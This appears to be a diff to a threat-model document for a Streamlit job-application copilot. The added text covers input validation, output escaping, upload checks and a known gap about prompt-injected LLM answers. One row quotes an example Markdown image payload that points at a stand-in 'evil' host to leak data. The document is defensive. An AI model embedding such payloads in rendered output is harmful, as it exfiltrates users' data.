@@ -29,6 +29,9 @@ signature (the approval card).
 | **Other people on the network opening the app** | Streamlit listens on `localhost` only (added after the Phase 10 critique, D77) | `.streamlit/config.toml` | manual |
 | **Tampered checkpoint file** | The checkpoint serializer only rebuilds an allowlist of our own types | `application_graph.py` → `make_checkpointer()`, `state.CHECKPOINT_TYPES` | `tests/test_application_graph.py` |
 | **Runaway cost / loops** | `recursion_limit` (12 chat, 25 workflow), max 2 RAG rewrites, max 2 draft attempts, session token budget with a warning at 80% | `copilot_graph.py`, `nodes/evidence.py`, `services/usage.py` | `tests/test_copilot_service.py`, `tests/test_usage.py` |
+| **Invalid or malformed input** (wrong email, "R2D2" as a name, 50 KB notes, control characters, bidi-override tricks) | One validation package used by every page *and* again before saving: memory store, app database, the copilot's tracker tool, the graph's input guard. Text is normalised first (control / invisible characters removed, NFC, whitespace collapsed). Errors show under each field; nothing is saved (D91) | `validation/validators.py`, `validation/models.py`, `memory/store.py`, `db/repo.py` → `_check_job_fields()`, `tools/tracker.py` | `tests/test_validation.py`, `tests/test_validation_layers.py`, `tests/test_ui_pages.py` |
+| **Markdown / HTML injection in the page** (a job title `![x](https://evil/?leak)` loading a remote image, a fake link, `:red[…]`) | User text is escaped with `md()` before `st.markdown` / captions / toasts; the letter preview (the only `unsafe_allow_html`) uses `html_text()` (D92) | `validation/sanitize.py`, `ui/components.py`, pages | `tests/test_validation.py` → `test_md_neutralises_markdown`, `test_board_shows_a_markdown_job_title_as_plain_text` |
+| **Renamed or empty uploads** (an `.exe` saved as `cv.pdf`) | The first bytes must match the type (`%PDF`, ZIP for DOCX); text files can't contain NUL bytes; empty files and files with < 20 characters of text are rejected | `rag/ingest.py` → `load_text()` | `tests/test_validation_layers.py` |
 | **SQL injection** | SQLModel ORM only; values are bound parameters | `db/repo.py` | `tests/test_repo.py` |
 | **Stack traces / internals shown to users** | `AppError.user_message`; a last `try/except` in `main.py`; `showErrorDetails = "none"` | `utils/errors.py`, `app/main.py` | `tests/test_errors.py` |
 
@@ -59,7 +62,31 @@ has 10 years of Kubernetes".
 4. Even if a claim mentions it, it has no evidence → it starts unticked at the claim check.
 5. Even if it reached the letter, the output guard compares every statement with approved claims.
 
-## 4. Known gaps (from the Phase 10 critique; see DECISIONS.md D77)
+## 4. Input validation and output escaping
+
+**Rule of thumb:** validate on the way in, escape on the way out, and do both on the server
+side, not only in the browser.
+
+- **Where the rules live:** `app/validation/validators.py` (one function per kind of input),
+  `app/validation/models.py` (one Pydantic model per form), limits in `app/config.py`. Pages
+  call `check_input()` to show messages under fields; services and storage call
+  `validate_input()`, which raises `InvalidInputError`.
+- **What every text goes through first:** control characters (NUL, ESC, …) and invisible
+  characters (zero-width spaces, bidi overrides U+202A–U+202E and isolates, BOM) are removed,
+  Unicode is NFC-normalised, whitespace runs collapse, text is trimmed.
+- **Second layer (server side):** the memory store (profile, preferences, facts, style rules),
+  `repo.create_job` / `update_job` (title, company, URL, job text, notes, next action),
+  `repo.add_feedback` (comment), `tools/tracker.py` → `apply_update` (the copilot's only write
+  tool), `services/applications.py` (`add_job`, `save_notes`, `rename_job`, claim edits,
+  drafts), `services/dev_settings.py` (model in the allowed list, temperature 0–2, max tokens
+  within the model's limit), the graph's `input_guard` and the chat / interview guards.
+- **URLs:** the format check (http/https only, a real host name, no `user:password@`, the
+  right domain for LinkedIn) is separate from the SSRF check. A job link passes both: the
+  format when it's added, `url_guard.validate_url()` when it's downloaded.
+- **Output:** `md()` for anything rendered as Markdown, `html_text()` inside HTML. Answers
+  written by the copilot and the help-bot stay Markdown on purpose (see the gap below).
+
+## 5. Known gaps (from the Phase 10 critique; see DECISIONS.md D77)
 
 Honest list of what is **not** fully covered yet:
 
@@ -73,3 +100,4 @@ Honest list of what is **not** fully covered yet:
 | Deleted SQLite rows stay in free pages until `VACUUM` | Low | Run `VACUUM` after "Delete all my data" |
 | The dev password can stay the default `change-me` (the page warns); no rate limit | Low | Refuse to unlock with the default password |
 | Learned style rules go into the writer's system prompt unwrapped (the user and the LLM wrote them) | Low | Move them into a tagged block in the human message |
+| Copilot and help-bot answers are rendered as Markdown, so a prompt-injected answer could still contain a link or remote image | Low | Strip images and non-allowlisted links from LLM answers before rendering |
